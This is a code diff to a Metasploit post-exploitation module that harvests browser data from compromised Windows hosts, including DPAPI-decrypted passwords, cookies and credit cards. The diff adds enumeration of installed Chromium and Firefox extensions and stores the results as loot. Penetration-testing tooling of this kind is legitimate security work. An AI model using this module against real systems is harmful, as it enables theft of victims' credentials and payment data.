@@ -16,7 +16,7 @@ class MetasploitModule < Msf::Post
           This post-exploitation module extracts sensitive browser data from both Chromium-based and Gecko-based browsers
           on the target system. It supports the decryption of passwords and cookies using Windows Data Protection API (DPAPI)
           and can extract additional data such as browsing history, keyword search history, download history, autofill data,
-          and credit card information.
+          credit card information and installed extensions.
         },
         'License' => MSF_LICENSE,
         'Platform' => ['win'],
@@ -399,6 +399,7 @@ class MetasploitModule < Msf::Post
     process_chromium_keyword_search_history(profile_path, browser)
     process_chromium_browsing_history(profile_path, browser)
     process_chromium_bookmarks(profile_path, browser)
+    process_chromium_extensions(profile_path, browser)
   end
 
   def process_chromium_logins(profile_path, encryption_key, browser)
@@ -511,6 +512,86 @@ class MetasploitModule < Msf::Post
     end
   end
 
+  def process_chromium_extensions(profile_path, browser)
+    extensions_dir = "#{profile_path}\\Extensions\\"
+    return unless directory?(extensions_dir)
+
+    extension_data = ''
+    session.fs.dir.entries(extensions_dir).each do |extension_id|
+      extension_path = "#{extensions_dir}\\#{extension_id}"
+      next unless directory?(extension_path)
+
+      session.fs.dir.entries(extension_path).each do |version_folder|
+        next if version_folder == '.' || version_folder == '..'
+
+        manifest_path = "#{extension_path}\\#{version_folder}\\manifest.json"
+        next unless file?(manifest_path)
+
+        manifest_data = read_file(manifest_path)
+        manifest_json = JSON.parse(manifest_data)
+
+        extension_name = manifest_json['name']
+        extension_version = manifest_json['version']
+
+        if extension_name.start_with?('__MSG_')
+          extension_name = resolve_chromium_extension_name(extension_path, extension_name, version_folder)
+        end
+
+        extension_data += "Name: #{extension_name}\nVersion: #{extension_version}\n\n"
+      end
+    end
+
+    unless extension_data.strip.empty?
+      browser_clean = browser.gsub('\\', '_').chomp('_')
+      timestamp = Time.now.strftime('%Y%m%d%H%M')
+      ip = session.sock.peerhost
+
+      file_name = store_loot("#{browser_clean}_Extensions", 'text/plain', session, extension_data, "#{timestamp}_#{ip}_#{browser_clean}_Extensions.txt", "#{browser_clean} Extensions")
+      file_size = ::File.size(file_name)
+      print_good("└ Extracted Extensions to #{file_name} (#{file_size} bytes)")
+    end
+  end
+
+  def resolve_chromium_extension_name(extension_path, name_key, version_folder)
+    resolved_key = name_key.gsub('__MSG_', '').gsub('__', '')
+
+    locales_dir = "#{extension_path}\\#{version_folder}\\_locales"
+    unless directory?(locales_dir)
+      return name_key
+    end
+
+    english_messages_path = "#{locales_dir}\\en\\messages.json"
+    if file?(english_messages_path)
+      messages_data = read_file(english_messages_path)
+      messages_json = JSON.parse(messages_data)
+
+      messages_json.each do |key, value|
+        if key.casecmp?(resolved_key) && value['message']
+          return value['message']
+        end
+      end
+      return name_key
+    end
+
+    session.fs.dir.entries(locales_dir).each do |locale_folder|
+      next if locale_folder == '.' || locale_folder == '..' || locale_folder == 'en'
+
+      messages_path = "#{locales_dir}\\#{locale_folder}\\messages.json"
+      next unless file?(messages_path)
+
+      messages_data = read_file(messages_path)
+      messages_json = JSON.parse(messages_data)
+
+      messages_json.each do |key, value|
+        if key.casecmp?(resolved_key) && value['message']
+          return value['message']
+        end
+      end
+    end
+
+    return name_key
+  end
+
   def extract_gecko_data(profile_path, browser)
     process_gecko_logins(profile_path, browser)
     process_gecko_cookies(profile_path, browser)
@@ -518,6 +599,7 @@ class MetasploitModule < Msf::Post
     process_gecko_keyword_search_history(profile_path, browser)
     process_gecko_browsing_history(profile_path, browser)
     process_gecko_bookmarks(profile_path, browser)
+    process_gecko_extensions(profile_path, browser)
   end
 
   def process_gecko_logins(profile_path, browser)
@@ -576,6 +658,35 @@ class MetasploitModule < Msf::Post
       extract_sql_data(bookmarks_path, 'SELECT moz_bookmarks.title AS title, moz_places.url AS url FROM moz_bookmarks JOIN moz_places ON moz_bookmarks.fk = moz_places.id', 'Bookmarks', browser)
     elsif datastore['VERBOSE']
       print_error("Bookmarks not found at #{bookmarks_path}")
+    end
+  end
+
+  def process_gecko_extensions(profile_path, browser)
+    addons_path = "#{profile_path}\\addons.json"
+    return unless file?(addons_path)
+
+    addons_data = read_file(addons_path)
+    addons_json = JSON.parse(addons_data)
+
+    extension_data = ''
+
+    if addons_json['addons']
+      addons_json['addons'].each do |addon|
+        extension_name = addon['name']
+        extension_version = addon['version']
+
+        extension_data += "Name: #{extension_name}\nVersion: #{extension_version}\n\n"
+      end
+    end
+
+    unless extension_data.strip.empty?
+      browser_clean = browser.gsub('\\', '_').chomp('_')
+      timestamp = Time.now.strftime('%Y%m%d%H%M')
+      ip = session.sock.peerhost
+
+      file_name = store_loot("#{browser_clean}_Extensions", 'text/plain', session, extension_data, "#{timestamp}_#{ip}_#{browser_clean}_Extensions.txt", "#{browser_clean} Extensions")
+      file_size = ::File.size(file_name)
+      print_good("└ Extracted Extensions to #{file_name} (#{file_size} bytes)")
     end
   end
 
